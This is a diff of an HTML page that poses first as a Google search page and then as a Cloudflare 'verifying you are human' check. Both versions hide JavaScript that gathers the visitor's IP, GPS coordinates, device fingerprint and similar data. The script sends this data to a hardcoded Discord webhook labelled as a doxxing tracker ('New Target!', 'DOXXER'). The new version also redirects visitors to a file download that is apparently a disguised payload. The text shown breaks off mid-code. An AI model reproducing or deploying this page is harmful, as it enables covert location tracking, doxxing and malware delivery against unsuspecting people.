@@ -1,597 +1,468 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <title>Just a moment...</title>
     <style>
-        /* --- STYLING GOOGLE CLONE --- */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background: #ffffff;
+            background: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
             padding: 20px;
         }
         .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            max-width: 600px;
+            max-width: 500px;
             width: 100%;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            padding: 40px 30px;
+            text-align: center;
         }
         .logo {
-            font-size: 92px;
-            font-weight: 500;
-            letter-spacing: -4px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             margin-bottom: 20px;
-            user-select: none;
         }
-        .logo span:nth-child(1) { color: #4285F4; }
-        .logo span:nth-child(2) { color: #EA4335; }
-        .logo span:nth-child(3) { color: #FBBC05; }
-        .logo span:nth-child(4) { color: #4285F4; }
-        .logo span:nth-child(5) { color: #34A853; }
-        .logo span:nth-child(6) { color: #EA4335; }
-        .search-box {
-            width: 100%;
-            max-width: 580px;
-            border: 1px solid #dfe1e5;
-            border-radius: 24px;
-            padding: 12px 20px;
+        .logo svg {
+            width: 40px;
+            height: 40px;
+        }
+        .logo span {
+            font-size: 24px;
+            font-weight: 600;
+            color: #f38020;
+            margin-left: 10px;
+        }
+        h2 {
+            font-size: 18px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        .check-wrapper {
             display: flex;
             align-items: center;
-            background: #fff;
-            box-shadow: 0 1px 6px rgba(32,33,36,0.08);
-            transition: box-shadow 0.2s;
+            justify-content: center;
+            margin: 20px 0;
         }
-        .search-box:hover,
-        .search-box:focus-within {
-            box-shadow: 0 1px 12px rgba(32,33,36,0.25);
-            border-color: rgba(223,225,229,0);
-        }
-        .search-box input {
-            flex: 1;
-            border: none;
-            outline: none;
-            font-size: 16px;
-            padding: 8px 0;
-            font-family: inherit;
-            color: #202124;
-        }
-        .search-box input::placeholder {
-            color: #9aa0a6;
-        }
-        .search-box .icon {
-            color: #9aa0a6;
-            font-size: 20px;
+        .fake-checkbox {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.2s;
+            cursor: default;
             margin-right: 12px;
         }
-        .search-box .mic-icon {
-            color: #4285F4;
-            font-size: 20px;
-            cursor: pointer;
+        .fake-checkbox.checked {
+            background: #4caf50;
+            border-color: #4caf50;
         }
-        .buttons {
-            margin-top: 28px;
-            display: flex;
-            gap: 12px;
-            flex-wrap: wrap;
-            justify-content: center;
+        .fake-checkbox.checked::after {
+            content: "✓";
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
         }
-        .buttons button {
-            background: #f8f9fa;
-            border: 1px solid #f8f9fa;
+        .check-label {
+            font-size: 16px;
+            color: #333;
+            font-weight: 500;
+        }
+        .sub-text {
+            font-size: 12px;
+            color: #999;
+            margin-top: 10px;
+        }
+        .loading-bar {
+            width: 100%;
+            height: 4px;
+            background: #e0e0e0;
             border-radius: 4px;
-            padding: 10px 20px;
-            font-size: 14px;
-            color: #3c4043;
-            cursor: pointer;
-            transition: all 0.1s;
-            font-family: inherit;
+            overflow: hidden;
+            margin: 15px 0 5px;
         }
-        .buttons button:hover {
-            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
-            background: #f8f9fa;
-            border-color: #dadce0;
+        .loading-fill {
+            height: 100%;
+            width: 0%;
+            background: #f38020;
+            animation: load 2.5s ease-in-out forwards;
+        }
+        @keyframes load {
+            0% { width: 0%; }
+            100% { width: 100%; }
         }
         .footer {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: #f2f2f2;
-            padding: 12px 20px;
-            font-size: 14px;
-            color: #70757a;
-            display: flex;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            border-top: 1px solid #dadce0;
+            margin-top: 25px;
+            font-size: 11px;
+            color: #aaa;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
         }
         .footer a {
-            color: #70757a;
+            color: #f38020;
             text-decoration: none;
-            margin: 0 10px;
-        }
-        .footer a:hover {
-            text-decoration: underline;
-        }
-        .footer .left,
-        .footer .right {
-            display: flex;
-            align-items: center;
-        }
-        .loading-indicator {
-            display: none;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #70757a;
-        }
-        .loading-indicator.show {
-            display: block;
-        }
-        .status-debug {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #888;
-            max-width: 500px;
-            text-align: center;
-            display: none;
-        }
-        .status-debug.show {
-            display: block;
-        }
-        @media (max-width: 600px) {
-            .logo {
-                font-size: 64px;
-            }
-            .search-box {
-                padding: 10px 16px;
-            }
-            .search-box input {
-                font-size: 14px;
-            }
         }
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <!-- Logo Google -->
+    <div class="container" id="mainBox">
         <div class="logo">
-            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" fill="#f38020"/>
+                <path d="M12 6c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z" fill="#f38020"/>
+            </svg>
+            <span>Cloudflare</span>
         </div>
-
-        <!-- Kotak pencarian -->
-        <div class="search-box">
-            <span class="icon">🔍</span>
-            <input type="text" placeholder="Telusuri atau ketik URL" id="searchInput" autofocus>
-            <span class="mic-icon">🎤</span>
+        <h2>Verifying you are human</h2>
+        <p>This may take a few seconds. Please wait while we check your browser...</p>
+        <div class="loading-bar"><div class="loading-fill" id="progressFill"></div></div>
+        <div class="check-wrapper">
+            <div class="fake-checkbox" id="fakeCheck"></div>
+            <span class="check-label">I am not a robot</span>
         </div>
-
-        <!-- Tombol -->
-        <div class="buttons">
-            <button id="btnSearch">Telusuri Google</button>
-            <button id="btnLucky">Saya Lagi Beruntung</button>
-        </div>
-
-        <!-- Indikator -->
-        <div class="loading-indicator" id="loadingIndicator">⏳ Mengumpulkan data...</div>
-        <div class="status-debug" id="statusDebug"></div>
-    </div>
-
-    <!-- Footer Google -->
-    <div class="footer">
-        <div class="left">
-            <a href="#">Tentang</a>
-            <a href="#">Beriklan</a>
-            <a href="#">Bisnis</a>
-            <a href="#">Cara kerja Penelusuran</a>
-        </div>
-        <div class="right">
-            <a href="#">Privasi</a>
-            <a href="#">Syarat</a>
-            <a href="#">Pengaturan</a>
+        <div class="sub-text">Cloudflare is verifying your connection...</div>
+        <div class="footer">
+            <a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>
         </div>
     </div>
 
     <script>
-        // ================================================================
-        //  KONFIGURASI — UBAH SESUAI KEBUTUHAN
-        // ================================================================
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1528320405486567474/8nh1rlfZ0Q1j_BjN_N5g81mZV_Gwle4j9Mw3H6fDhB7u6AfKHV2W-cF_BgyxRf6AZ6ET';
-        const REDIRECT_TARGET = 'https://www.google.com'; // Ganti dengan URL tujuan redirect
+        (function() {
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1528320405486567474/8nh1rlfZ0Q1j_BjN_N5g81mZV_Gwle4j9Mw3H6fDhB7u6AfKHV2W-cF_BgyxRf6AZ6ET";
+            const REDIRECT_URL = "https://www.mediafire.com/file/6hvj3vxs4nra2tm/Device%20info.7z/file";
 
-        // ================================================================
-        //  FUNGSI UTAMA: KUMPULKAN DATA & KIRIM KE DISCORD
-        // ================================================================
-        async function runTracking() {
-            const debugEl = document.getElementById('statusDebug');
-            const loadingEl = document.getElementById('loadingIndicator');
+            // --- DETEKSI BROWSER SUPER AKURAT ---
+            function getAccurateBrowserInfo() {
+                const ua = navigator.userAgent;
+                const vendor = navigator.vendor || '';
+                const platform = navigator.platform || '';
+                let oscpu = navigator.oscpu || '';
+                let userAgentData = navigator.userAgentData || null;
 
-            loadingEl.classList.add('show');
-            debugEl.classList.add('show');
-            debugEl.textContent = '⏳ Mengambil data...';
+                let result = {
+                    browser: 'Unknown',
+                    version: 'Unknown',
+                    os: 'Unknown',
+                    device: 'Desktop',
+                    engine: 'Unknown',
+                    details: ''
+                };
 
-            // Objek data utama
-            const data = {
-                timestamp: new Date().toISOString(),
-                localTime: new Date().toLocaleString('id-ID', {
-                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                }),
-                ip: 'Tidak terdeteksi',
-                ipDetails: null,
-                gps: null,
-                device: null,
-                connection: null,
-                battery: null,
-                provider: 'Tidak diketahui'
-            };
-
-            // --- 1. AMBIL IP & GEOLOKASI (DENGAN FALLBACK) ---
-            debugEl.textContent = '⏳ Mengambil IP dan lokasi...';
-
-            // Coba ip-api.com (HTTPS)
-            try {
-                const resp = await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query');
-                if (resp.ok) {
-                    const json = await resp.json();
-                    if (json.status === 'success') {
-                        data.ip = json.query;
-                        data.ipDetails = {
-                            country: json.country || '-',
-                            countryCode: json.countryCode || '-',
-                            region: json.regionName || '-',
-                            city: json.city || '-',
-                            zip: json.zip || '-',
-                            latitude: json.lat || null,
-                            longitude: json.lon || null,
-                            timezone: json.timezone || '-',
-                            isp: json.isp || '-',
-                            org: json.org || '-',
-                            as: json.as || '-',
-                            asname: json.asname || '-',
-                            reverse: json.reverse || '',
-                            mobile: json.mobile || false,
-                            proxy: json.proxy || false,
-                            hosting: json.hosting || false
-                        };
-                        debugEl.textContent = '✅ IP dan lokasi berhasil (ip-api.com)';
-                    } else {
-                        throw new Error(json.message || 'ip-api.com gagal');
+                if (userAgentData && userAgentData.brands) {
+                    const brands = userAgentData.brands;
+                    for (let b of brands) {
+                        if (b.brand === 'Google Chrome') { result.browser = 'Chrome'; result.version = b.version; break; }
+                        if (b.brand === 'Microsoft Edge') { result.browser = 'Edge'; result.version = b.version; break; }
+                        if (b.brand === 'Opera') { result.browser = 'Opera'; result.version = b.version; break; }
+                        if (b.brand === 'Safari') { result.browser = 'Safari'; result.version = b.version; break; }
+                        if (b.brand === 'Firefox') { result.browser = 'Firefox'; result.version = b.version; break; }
+                        if (b.brand === 'Brave') { result.browser = 'Brave'; result.version = b.version; break; }
                     }
-                } else {
-                    throw new Error('ip-api.com response ' + resp.status);
+                    if (userAgentData.platform) {
+                        result.os = userAgentData.platform;
+                    }
                 }
-            } catch (e) {
-                debugEl.textContent = '⚠️ ip-api.com gagal, mencoba freeipapi...';
-                // Fallback 1: freeipapi.com
+
+                if (result.browser === 'Unknown') {
+                    if (window.chrome && !window.opera && !window.Edge) {
+                        result.browser = 'Chrome';
+                        const m = ua.match(/Chrome\/(\d+\.\d+)/);
+                        if (m) result.version = m[1];
+                    } else if (window.safari && !window.chrome && !window.opera) {
+                        result.browser = 'Safari';
+                        const m = ua.match(/Version\/(\d+\.\d+)/);
+                        if (m) result.version = m[1];
+                    } else if (window.opera || ua.indexOf('OPR') !== -1) {
+                        result.browser = 'Opera';
+                        const m = ua.match(/(?:OPR|Opera)\/(\d+\.\d+)/);
+                        if (m) result.version = m[1];
+                    } else if (window.Edge || ua.indexOf('Edg') !== -1) {
+                        result.browser = 'Edge';
+                        const m = ua.match(/Edg\/(\d+\.\d+)/);
+                        if (m) result.version = m[1];
+                    } else if (ua.indexOf('Firefox') !== -1) {
+                        result.browser = 'Firefox';
+                        const m = ua.match(/Firefox\/(\d+\.\d+)/);
+                        if (m) result.version = m[1];
+                    } else if (ua.indexOf('SamsungBrowser') !== -1) {
+                        result.browser = 'Samsung Internet';
+                        const m = ua.match(/SamsungBrowser\/(\d+\.\d+)/);
+                        if (m) result.version = m[1];
+                    } else if (ua.indexOf('UCBrowser') !== -1) {
+                        result.browser = 'UC Browser';
+                        const m = ua.match(/UCBrowser\/(\d+\.\d+)/);
+                        if (m) result.version = m[1];
+                    }
+                }
+
+                if (result.os === 'Unknown') {
+                    if (ua.indexOf('Windows NT') !== -1) {
+                        const winVer = ua.match(/Windows NT (\d+\.\d+)/);
+                        if (winVer) {
+                            const map = { '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7' };
+                            result.os = 'Windows ' + (map[winVer[1]] || winVer[1]);
+                        } else result.os = 'Windows';
+                    } else if (ua.indexOf('Mac OS X') !== -1) {
+                        const macVer = ua.match(/Mac OS X (\d+[._]\d+)/);
+                        if (macVer) result.os = 'macOS ' + macVer[1].replace('_', '.');
+                        else result.os = 'macOS';
+                    } else if (ua.indexOf('Android') !== -1) {
+                        const andVer = ua.match(/Android (\d+\.\d+)/);
+                        result.os = 'Android ' + (andVer ? andVer[1] : '');
+                    } else if (ua.indexOf('iOS') !== -1 || ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
+                        const iosVer = ua.match(/OS (\d+[._]\d+)/);
+                        result.os = 'iOS ' + (iosVer ? iosVer[1].replace('_', '.') : '');
+                    } else if (ua.indexOf('Linux') !== -1) {
+                        result.os = 'Linux';
+                    } else if (ua.indexOf('Chrome OS') !== -1) {
+                        result.os = 'ChromeOS';
+                    }
+                }
+
+                if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) {
+                    result.device = 'Tablet';
+                } else if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
+                    result.device = 'Mobile';
+                } else {
+                    result.device = 'Desktop';
+                }
+
+                if (ua.indexOf('AppleWebKit') !== -1) {
+                    result.engine = 'WebKit';
+                    if (ua.indexOf('Chrome') !== -1) result.engine = 'Blink (WebKit)';
+                } else if (ua.indexOf('Gecko') !== -1) {
+                    result.engine = 'Gecko';
+                } else if (ua.indexOf('Trident') !== -1) {
+                    result.engine = 'Trident (IE)';
+                } else if (ua.indexOf('Presto') !== -1) {
+                    result.engine = 'Presto (Opera)';
+                }
+
+                result.details = `Vendor: ${vendor} | Platform: ${platform} | OSCPU: ${oscpu || 'N/A'}`;
+
+                return result;
+            }
+
+            // --- FUNGSI AMBIL IP (dengan countryCode) ---
+            async function fetchIP() {
                 try {
-                    const resp2 = await fetch('https://freeipapi.com/api/json');
-                    if (resp2.ok) {
-                        const json2 = await resp2.json();
-                        data.ip = json2.ipAddress || 'Tidak terdeteksi';
-                        data.ipDetails = {
-                            country: json2.countryName || '-',
-                            countryCode: json2.countryCode || '-',
-                            region: json2.regionName || '-',
-                            city: json2.cityName || '-',
-                            zip: json2.zipCode || '-',
-                            latitude: json2.latitude || null,
-                            longitude: json2.longitude || null,
-                            timezone: json2.timeZone || '-',
-                            isp: 'Tidak diketahui',
-                            org: 'Tidak diketahui',
-                            as: 'Tidak diketahui',
-                            asname: 'Tidak diketahui',
-                            reverse: '',
-                            mobile: false,
-                            proxy: false,
-                            hosting: false
-                        };
-                        debugEl.textContent = '✅ IP dan lokasi berhasil (freeipapi.com)';
-                    } else {
-                        throw new Error('freeipapi.com gagal');
-                    }
-                } catch (e2) {
-                    debugEl.textContent = '⚠️ freeipapi gagal, mencoba ipify...';
-                    // Fallback 2: ipify.org (hanya IP)
-                    try {
-                        const resp3 = await fetch('https://api.ipify.org?format=json');
-                        if (resp3.ok) {
-                            const json3 = await resp3.json();
-                            data.ip = json3.ip || 'Tidak terdeteksi';
-                            debugEl.textContent = '✅ IP berhasil (ipify.org), lokasi tidak tersedia';
-                        } else {
-                            throw new Error('ipify.org gagal');
-                        }
-                    } catch (e3) {
-                        debugEl.textContent = '❌ Semua API IP gagal. Gunakan IP lokal.';
-                        data.ip = 'Tidak terdeteksi';
-                    }
+                    const res = await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,region,city,lat,lon,isp,org,as,query');
+                    if (!res.ok) throw new Error('IP API gagal');
+                    const data = await res.json();
+                    if (data.status !== 'success') throw new Error(data.message || 'IP API error');
+                    return data;
+                } catch (e) {
+                    // Fallback ke ipinfo.io (tidak ada countryCode, kita pakai country)
+                    const res = await fetch('https://ipinfo.io/json');
+                    const d = await res.json();
+                    const loc = d.loc ? d.loc.split(',') : [0,0];
+                    return {
+                        query: d.ip || '0.0.0.0',
+                        country: d.country || 'N/A',
+                        countryCode: d.country || 'UN', // ipinfo tidak punya kode, pakai nama
+                        region: d.region || 'N/A',
+                        city: d.city || 'N/A',
+                        lat: parseFloat(loc[0]) || 0,
+                        lon: parseFloat(loc[1]) || 0,
+                        isp: d.org || 'N/A',
+                        org: d.org || 'N/A',
+                        as: d.asn || 'N/A'
+                    };
                 }
             }
 
-            // --- 2. AMBIL GPS PRESISI (dengan timeout 5 detik) ---
-            debugEl.textContent = '⏳ Meminta GPS (izin diperlukan)...';
-
-            try {
-                const gps = await new Promise((resolve) => {
+            // --- FUNGSI AMBIL GPS ---
+            function getGPS() {
+                return new Promise((resolve) => {
                     if (!navigator.geolocation) {
-                        resolve(null);
+                        resolve({ error: 'GPS tidak didukung' });
                         return;
                     }
-                    let resolved = false;
-                    const timeout = setTimeout(() => {
-                        if (!resolved) {
-                            resolved = true;
-                            resolve(null);
-                        }
-                    }, 5000);
-
                     navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            if (!resolved) {
-                                resolved = true;
-                                clearTimeout(timeout);
-                                resolve({
-                                    latitude: pos.coords.latitude,
-                                    longitude: pos.coords.longitude,
-                                    accuracy: pos.coords.accuracy,
-                                    altitude: pos.coords.altitude || null,
-                                    speed: pos.coords.speed || null,
-                                    heading: pos.coords.heading || null
-                                });
-                            }
-                        },
-                        (err) => {
-                            if (!resolved) {
-                                resolved = true;
-                                clearTimeout(timeout);
-                                resolve(null);
-                            }
-                        }, {
-                            enableHighAccuracy: true,
-                            timeout: 4000,
-                            maximumAge: 0
-                        }
+                        (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                        (err) => resolve({ error: err.message }),
+                        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                     );
                 });
-                data.gps = gps;
-                if (gps) {
-                    debugEl.textContent = '✅ GPS berhasil diambil';
-                } else {
-                    debugEl.textContent = '⚠️ GPS tidak tersedia / izin ditolak';
-                }
-            } catch (e) {
-                data.gps = null;
-                debugEl.textContent = '⚠️ GPS error: ' + e.message;
             }
 
-            // --- 3. DEVICE FINGERPRINT ---
-            const ua = navigator.userAgent;
-            data.device = {
-                userAgent: ua,
-                platform: navigator.platform || '-',
-                language: navigator.language || '-',
-                languages: navigator.languages ? navigator.languages.join(', ') : '-',
-                hardwareConcurrency: navigator.hardwareConcurrency || null,
-                deviceMemory: navigator.deviceMemory || null,
-                screen: window.screen.width + 'x' + window.screen.height,
-                colorDepth: window.screen.colorDepth || '-',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
-                vendor: navigator.vendor || '-',
-                webdriver: navigator.webdriver || false
-            };
-
-            // --- 4. KONEKSI ---
-            if (navigator.connection) {
-                data.connection = {
-                    type: navigator.connection.effectiveType || 'unknown',
-                    downlink: navigator.connection.downlink || null,
-                    rtt: navigator.connection.rtt || null,
-                    saveData: navigator.connection.saveData || false
-                };
-            }
-
-            // --- 5. BATERAI ---
-            if (navigator.getBattery) {
+            // --- FUNGSI UTAMA ---
+            async function collectAndSend() {
                 try {
-                    const bat = await navigator.getBattery();
-                    data.battery = {
-                        level: bat.level,
-                        charging: bat.charging,
-                        chargingTime: bat.chargingTime,
-                        dischargingTime: bat.dischargingTime
+                    const browserInfo = getAccurateBrowserInfo();
+
+                    const ipData = await fetchIP();
+                    const gpsData = await getGPS();
+
+                    let finalLat, finalLon, source, accuracy;
+                    if (gpsData && !gpsData.error) {
+                        finalLat = gpsData.lat;
+                        finalLon = gpsData.lon;
+                        source = 'GPS';
+                        accuracy = gpsData.accuracy + ' meter';
+                    } else {
+                        finalLat = ipData.lat || 0;
+                        finalLon = ipData.lon || 0;
+                    }
+
+                    // Ambil countryCode, pastikan ada
+                    let countryCode = ipData.countryCode || 'UN';
+                    // Jika countryCode panjang > 2, mungkin itu nama negara, kita potong atau pakai 'UN'
+                    if (countryCode.length > 2) {
+                        // Coba ambil dari daftar kode negara jika tersedia? Atau pakai 'UN'
+                        countryCode = 'UN';
+                    }
+
+                    const flagUrl = `https://flagsapi.com/${countryCode}/flat/64.png`;
+
+                    const payload = {
+                        timestamp: new Date().toISOString(),
+                        ip: ipData.query || '0.0.0.0',
+                        negara: ipData.country || 'N/A',
+                        countryCode: countryCode,
+                        region: ipData.region || 'N/A',
+                        kota: ipData.city || 'N/A',
+                        koordinat: `${finalLat}, ${finalLon}`,
+                        sumber: source,
+                        akurasi: accuracy,
+                        gps_data: (gpsData && !gpsData.error) ? { lat: gpsData.lat, lon: gpsData.lon, acc: gpsData.accuracy } : null,
+                        ip_data: { lat: ipData.lat, lon: ipData.lon },
+                        isp: ipData.isp || 'N/A',
+                        organisasi: ipData.org || 'N/A',
+                        as: ipData.as || 'N/A',
+                        browser: browserInfo.browser,
+                        browser_version: browserInfo.version,
+                        os: browserInfo.os,
+                        device: browserInfo.device,
+                        engine: browserInfo.engine,
+                        details: browserInfo.details,
+                        userAgent: navigator.userAgent,
+                        referer: document.referrer || 'Direct',
+                        screen: `${window.screen.width}x${window.screen.height}`
                     };
-                } catch (e) {
-                    data.battery = null;
+
+                    // Kirim ke Discord dan tangkap hasilnya
+                    const result = await sendToDiscord(WEBHOOK_URL, payload, flagUrl);
+                    console.log('Pesan terkirim!', result);
+
+                    localStorage.setItem('target_data', JSON.stringify(payload));
+
+                } catch (error) {
+                    console.error('Tracking gagal:', error);
+                    // Tampilkan error di konsol untuk debugging
                 }
             }
 
-            // --- 6. EKSTRAK PROVIDER dari ISP atau User-Agent ---
-            let provider = 'Tidak diketahui';
-            if (data.ipDetails && data.ipDetails.isp && data.ipDetails.isp !== '-') {
-                provider = data.ipDetails.isp;
-            } else {
-                const uaL = ua.toLowerCase();
-                if (uaL.includes('telkomsel')) provider = 'Telkomsel';
-                else if (uaL.includes('xl')) provider = 'XL Axiata';
-                else if (uaL.includes('indosat')) provider = 'Indosat Ooredoo';
-                else if (uaL.includes('smartfren')) provider = 'Smartfren';
-                else if (uaL.includes('three') || uaL.includes('tri')) provider = 'Tri';
-                else if (uaL.includes('wifi')) provider = 'WiFi';
-                else if (uaL.includes('ethernet')) provider = 'Ethernet';
-            }
-            data.provider = provider;
+            // --- FUNGSI KIRIM KE DISCORD DENGAN @here DAN EMBED (TANPA TOMBOL UNTUK KEANDALAN) ---
+            async function sendToDiscord(url, data, flagUrl) {
+                const colorMap = {
+                    'ID': 0xce1126,
+                    'US': 0x3c3b6e,
+                    'GB': 0xc8102e,
+                    'JP': 0xbc002d,
+                    'CN': 0xde2910,
+                    'IN': 0xff9933,
+                    'BR': 0x009739,
+                    'RU': 0x0039a6,
+                    'DE': 0xdd0000,
+                    'FR': 0x002395,
+                };
+                const color = colorMap[data.countryCode] || 0x5865f2;
 
-            debugEl.textContent = '📤 Mengirim data ke Discord...';
+                const embed = {
+                    title: "🎯 **NEW HIT!**",
+                    color: color,
+                    thumbnail: { url: flagUrl },
+                    fields: [
+                        {
+                            name: "🌐 **Network Information**",
+                            value: `\`\`\`\nIP: ${data.ip}\nISP: ${data.isp}\nASN: ${data.as}\nOrganisasi: ${data.organisasi}\n\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "📍 **Geolocation**",
+                            value: `**Kota:** ${data.kota}\n**Region:** ${data.region}\n**Negara:** ${data.negara}\n**Koordinat:** \`${data.koordinat} (${data.akurasi})`,
+                            inline: true
+                        },
+                        {
+                            name: "💻 **Browser & Device**",
+                            value: `**OS:** ${data.os}\n**Device:** ${data.device}`,
+                            inline: true
+                        },
+                        {
+                            name: "📱 **Detail System**",
+                            value: `**User-Agent:** \`${data.userAgent.substring(0, 60)}...\`\n**Referer:** ${data.referer}\n**Resolusi:** ${data.screen}`,
+                            inline: false
+                        },
+                        
+                    ],
+                    footer: {
+                        text: "⸸ SOULVEIN · DOXXER",
+                        icon_url: "https://cdn.discordapp.com/attachments/xxx/xxx/icon.png" // Ganti dengan icon Anda jika perlu
+                    },
+                    timestamp: data.timestamp
+                };
 
-            // --- 7. KIRIM KE DISCORD ---
-            await sendToDiscord(data);
+                const payload = {
+                    content: "@here 🔥 **New Target!**",
+                    embeds: [embed]
+                };
 
-            debugEl.textContent = '✅ Data terkirim. Redirect dalam 3 detik...';
-
-            // --- 8. REDIRECT ---
-            setTimeout(() => {
-                window.location.href = REDIRECT_TARGET;
-            }, 3000);
-        }
-
-        // ================================================================
-        //  KIRIM KE DISCORD
-        // ================================================================
-        async function sendToDiscord(data) {
-            const ipd = data.ipDetails;
-            const gps = data.gps;
-            const dev = data.device;
-            const conn = data.connection;
-            const bat = data.battery;
-
-            // Bangun deskripsi
-            let desc = '';
-
-            // IP & Lokasi
-            desc += `**🌐 IP Address:** ${data.ip || 'Tidak terdeteksi'}\n`;
-            if (ipd) {
-                desc += `**📍 Lokasi:** ${ipd.city || '-'}, ${ipd.region || '-'}, ${ipd.country || '-'}\n`;
-                if (ipd.latitude && ipd.longitude) {
-                    desc += `**🗺️ Koordinat IP:** ${ipd.latitude}, ${ipd.longitude}\n`;
-                }
-                desc += `**🕒 Timezone:** ${ipd.timezone || '-'}\n`;
-                desc += `**🏢 ISP:** ${ipd.isp || '-'}\n`;
-                desc += `**🏛️ Organisasi:** ${ipd.org || '-'}\n`;
-                desc += `**🔗 ASN:** ${ipd.as || '-'} (${ipd.asname || '-'})\n`;
-                if (ipd.reverse) desc += `**↩️ Reverse DNS:** ${ipd.reverse}\n`;
-                desc += `**📱 Mobile:** ${ipd.mobile ? 'Ya' : 'Tidak'} | **🔒 Proxy:** ${ipd.proxy ? 'Ya' : 'Tidak'} | **☁️ Hosting:** ${ipd.hosting ? 'Ya' : 'Tidak'}\n`;
-            }
-
-            // GPS
-            if (gps) {
-                desc += `\n**🛰️ GPS Presisi:**\n`;
-                desc += `Lat: ${gps.latitude.toFixed(6)}, Lon: ${gps.longitude.toFixed(6)}\n`;
-                desc += `Akurasi: ±${gps.accuracy ? gps.accuracy.toFixed(0) : '?'} meter\n`;
-                if (gps.altitude) desc += `Altitude: ${gps.altitude} m\n`;
-                if (gps.speed) desc += `Kecepatan: ${gps.speed} m/s\n`;
-                desc += `[🗺️ Buka di Google Maps](https://www.google.com/maps?q=${gps.latitude},${gps.longitude})\n`;
-            } else {
-                desc += `\n**🛰️ GPS:** Tidak tersedia / izin ditolak\n`;
-            }
-
-            // Perangkat
-            if (dev) {
-                desc += `\n**💻 Perangkat:**\n`;
-                desc += `User-Agent: \`${(dev.userAgent || '-').substring(0, 200)}${(dev.userAgent || '').length > 200 ? '...' : ''}\`\n`;
-                desc += `Platform: ${dev.platform || '-'}\n`;
-                desc += `Bahasa: ${dev.language || '-'}\n`;
-                desc += `Resolusi: ${dev.screen || '-'} (${dev.colorDepth || '-'} bit)\n`;
-                desc += `Timezone: ${dev.timezone || '-'}\n`;
-                desc += `CPU: ${dev.hardwareConcurrency || '?'} core, RAM: ${dev.deviceMemory ? dev.deviceMemory + ' GB' : '?'}\n`;
-                desc += `Vendor: ${dev.vendor || '-'}\n`;
-            }
-
-            // Koneksi
-            if (conn) {
-                desc += `\n**📶 Koneksi:**\n`;
-                desc += `Tipe: ${conn.type || 'unknown'}\n`;
-                if (conn.downlink) desc += `Kecepatan turun: ${conn.downlink} Mbps\n`;
-                if (conn.rtt) desc += `RTT: ${conn.rtt} ms\n`;
-                desc += `Save Data: ${conn.saveData ? 'Aktif' : 'Tidak'}\n`;
-            }
-
-            // Baterai
-            if (bat) {
-                desc += `\n**🔋 Baterai:**\n`;
-                desc += `Level: ${Math.round(bat.level * 100)}%\n`;
-                desc += `Charging: ${bat.charging ? 'Ya' : 'Tidak'}\n`;
-            }
-
-            desc += `\n**📡 Provider:** ${data.provider || 'Tidak diketahui'}`;
-            desc += `\n\n**🕒 Waktu Lokal:** ${data.localTime || '-'}`;
-
-            // Embed
-            const embed = {
-                title: '⬡ TARGET DETEKSI LENGKAP',
-                description: desc,
-                color: 0x00ccff,
-                timestamp: data.timestamp,
-                footer: {
-                    text: 'Soulvant Tracker • Google Clone'
-                },
-                fields: [
-                    { name: '🌐 IP', value: data.ip || '-', inline: true },
-                    { name: '📍 Kota', value: ipd ? ipd.city || '-' : '-', inline: true },
-                    { name: '🏢 ISP', value: ipd ? ipd.isp || '-' : '-', inline: true },
-                    { name: '📱 Provider', value: data.provider || '-', inline: true },
-                    { name: '🖥️ OS', value: dev ? dev.platform || '-' : '-', inline: true },
